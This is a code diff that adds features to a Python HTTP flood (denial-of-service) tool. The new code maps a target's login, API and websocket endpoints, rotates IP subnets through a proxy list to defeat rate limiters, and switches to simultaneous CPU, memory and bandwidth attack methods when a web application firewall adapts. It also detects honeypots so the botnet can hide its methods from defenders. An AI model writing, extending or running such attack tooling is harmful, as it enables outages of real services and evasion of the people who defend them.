@@ -1226,6 +1226,25 @@ class AsyncHttpFlood(Thread):
                         print(f"{bcolors.OKGREEN}[GTI SYNC] Loaded Cyber-Experience for architecture [{sig}]. Adapting immediately.{bcolors.RESET}")
         except: pass
 
+    def _chaos_build_topology_mesh(self):
+        """Map out target microservices dynamically.
+        Modern infrastructure separates APIs, Auth, and Static Delivery. 
+        We build a mesh to attack them hierarchically."""
+        intel = self._chaos_intel
+        if intel["total_executions"] % 150 == 0:
+            # Sort discovered paths into the mesh
+            mesh = intel["topology_mesh"]
+            for path in intel.get("uncached_paths", []) + intel.get("endpoints_discovered", []):
+                p = path.lower()
+                if any(x in p for x in ['login', 'auth', 'signin', 'oauth']):
+                    if path not in mesh["auth_endpoints"]: mesh["auth_endpoints"].append(path)
+                elif any(x in p for x in ['api', 'v1', 'v2', 'graphql']):
+                    if path not in mesh["api_endpoints"]: mesh["api_endpoints"].append(path)
+                elif any(x in p for x in ['.png', '.css', '.js', '.woff']):
+                    if path not in mesh["static_assets"]: mesh["static_assets"].append(path)
+                elif 'ws' in p or 'socket' in p:
+                    if path not in mesh["websockets"]: mesh["websockets"].append(path)
+
     def _chaos_honeypot_scanner(self):
         """Detect if WAF/SOC is feeding us a fake tarpit (Honeypot) to study our botnet.
         If true, play dumb. Do not expose zero-days or advanced methods."""
@@ -3083,6 +3102,15 @@ class HttpFlood(Thread):
         "honeypot_detected": False,       # Has the WAF router trapped us?
         "adaptive_threads": 500,          # Self-scaling thread boundaries
         "gti_match_score": 0,             # How similar this target is to past conquests
+        "multi_vector_active": False,     # Are we launching orthogonal attacks simultaneously?
+        "topology_mesh": {                # Deep map of discovered backend microservices
+            "auth_endpoints": [],
+            "api_endpoints": [],
+            "static_assets": [],
+            "websockets": []
+        },
+        "battering_ram_method": None,     # Track what method is currently used as the ReDos battering ram
+        "quantum_state_active": False,    # True if we are continuously switching IP-Subnets to confuse rate limiters
     }
     
     # ========================================================================
@@ -5261,6 +5289,13 @@ class HttpFlood(Thread):
         # Phase 1.11.1.5: GTI Cross-Target Memory Sync
         self._chaos_gti_sync()
         self._chaos_honeypot_scanner()
+        self._chaos_build_topology_mesh()
+        
+        # Subnet/Quantum IP rotation to break Rate Limiters
+        if intel.get("anomaly_score", 0) > 70 and len(PROXY_LIST) > 1000:
+            intel["quantum_state_active"] = True
+        else:
+            intel["quantum_state_active"] = False
         self._chaos_adaptive_scaling()
         
         # Adjust internal loop multiplier dynamically
@@ -5345,6 +5380,23 @@ class HttpFlood(Thread):
             "BOT": 1, "COOKIE": 1, "STEALTH_JA3": 1,
         })
         
+        # Phase 2.5.5: MULTI-VECTOR PROTOCOL (Omni-Directional Strike)
+        # Instead of 1 method, if WAF adapts, hit with 3 completely orthogonal methods simultaneously
+        # Example: Hit CPU via WP_SEARCH, hit Memory via SLOW_V2, hit Bandwidth via POST_DYN
+        if intel.get("waf_adapting") and not intel.get("multi_vector_active") and not intel.get("shadow_protocol_active"):
+            intel["multi_vector_active"] = True
+            for m in weights: weights[m] = 0
+            
+            # Form the orthogonal strike team
+            combo = ["STEALTH_JA3", "SLOW_V2", "XMLRPC_AMP"] if intel.get("target_type") == "php" else ["STEALTH_JA3", "SLOW_V2", "POST_DYN"]
+            for m in combo:
+                if m in list(intel["efficiency_score"].keys()):
+                    weights[m] = 100
+                else: weights[m] = 50
+                
+            if int(REQUESTS_SENT) < 2500:
+                print(f"{bcolors.FAIL}[CHAOS TACTICAL] WAF Adaptation detected. Launching OMNI-DIRECTIONAL MULTI-VECTOR strike.{bcolors.RESET}")
+                
         # Phase 2.6: Reinforcement Learning (Q-Table) Action Injection - Epsilon Greedy
         state = intel.get("current_state", "PROBE")
         q = intel.get("q_table", {})
@@ -5607,6 +5659,12 @@ class HttpFlood(Thread):
                 print(f"  GTI Core    : Global Threat Intel: {bcolors.OKGREEN}{gti}{bcolors.RESET} | Active Swarm Size: {thd} units (Auto-Scaled)")
                 if intel.get("honeypot_detected"):
                     print(f"  {bcolors.FAIL}>> WARNING: HONEYPOT DETECTED. Executing counter-intel dumb protocols. <<{bcolors.RESET}")
+                
+                mv_str = f"{bcolors.WARNING}ENGAGED{bcolors.RESET}" if intel.get("multi_vector_active") else "Standby"
+                qs_str = f"{bcolors.OKCYAN}SHIFTING{bcolors.RESET}" if intel.get("quantum_state_active") else "Stable"
+                auth = len(intel.get("topology_mesh", {}).get("auth_endpoints", []))
+                apis = len(intel.get("topology_mesh", {}).get("api_endpoints", []))
+                print(f"  Tactical    : Multi-Vector: {mv_str} | Quantum IP State: {qs_str} | Microservices Mapped: Auth({auth}) API({apis})")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
